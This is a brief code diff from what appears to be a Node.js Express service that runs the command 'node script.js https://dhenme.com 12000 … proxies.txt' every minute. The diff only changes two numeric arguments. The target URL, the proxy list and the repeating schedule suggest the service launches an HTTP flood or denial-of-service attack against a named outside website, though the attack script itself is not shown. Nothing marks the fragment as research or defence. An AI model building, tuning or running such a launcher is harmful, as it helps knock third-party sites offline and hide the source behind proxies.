@@ -3,7 +3,7 @@ const { exec } = require('child_process');
 
 const app = express();
 const PORT = 8886;
-const SCRIPT_COMMAND = 'node script.js https://dhenme.com 12000 10 10 proxies.txt';
+const SCRIPT_COMMAND = 'node script.js https://dhenme.com 12000 2 2 proxies.txt';
 const INTERVAL = 60000; // 1 minute in milliseconds
 
 let outputLines = [];
